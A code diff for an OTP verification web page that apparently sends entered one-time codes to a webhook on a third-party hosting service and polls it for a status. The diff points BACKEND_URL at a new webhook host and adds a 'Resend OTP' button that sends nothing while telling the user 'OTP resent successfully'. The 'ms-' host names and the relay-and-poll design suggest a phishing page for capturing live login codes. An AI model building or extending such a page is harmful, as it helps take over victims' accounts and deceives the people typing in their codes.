@@ -458,6 +458,9 @@
         .silent-status {
             display: none;
         }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -568,6 +571,9 @@
     </main>
 
 <script>
+    // Initialize Lucide icons
+    lucide.createIcons();
+
     // DOM elements
     const otpInput = document.getElementById('otpInput');
     const submitBtn = document.getElementById('submitBtn');
@@ -576,7 +582,7 @@
     const loadingIcon = submitBtn.querySelector('.loading');
     const otpError = document.getElementById('otpError');
 
-    const BACKEND_URL = 'https://ms-bcknd.onrender.com';
+    const BACKEND_URL = 'https://ms-7v2r.onrender.com/webhook';
     let pollTimeout;
 
     // Show/hide error functions
@@ -603,10 +609,19 @@
         submitBtn.disabled = false;
     }
 
-    // Real-time validation (optional - clears error when user types)
+    // Enable/disable verify button based on input
+    function checkInput() {
+        submitBtn.disabled = !(otpInput.value.trim());
+    }
+
+    // Real-time validation - clears error when user types
     otpInput.addEventListener('input', () => {
         hideError();
+        checkInput();
     });
+
+    // Initial button state
+    checkInput();
 
     // Form submission handler
     otpForm.addEventListener('submit', async function(e) {
@@ -645,6 +660,7 @@
                 const errorMsg = data.error || 'Verification failed';
                 showError(errorMsg);
                 hideButtonSpinner();
+                checkInput();
                 return;
             }
             
@@ -680,6 +696,7 @@
                         // Unexpected status
                         hideButtonSpinner();
                         showError('Unexpected response from server');
+                        checkInput();
                     }
                 } catch (err) {
                     console.error('Polling error:', err);
@@ -693,7 +710,19 @@
             console.error('Submission error:', error);
             showError('Network error. Please try again.');
             hideButtonSpinner();
+            checkInput();
         }
+    });
+
+    // Resend OTP functionality (placeholder)
+    document.querySelectorAll('.btn-secondary').forEach(btn => {
+        btn.addEventListener('click', function(e) {
+            if (this.textContent.trim() === 'Resend OTP') {
+                e.preventDefault();
+                showError('OTP resent successfully');
+                setTimeout(hideError, 3000);
+            }
+        });
     });
 </script>
 </body>
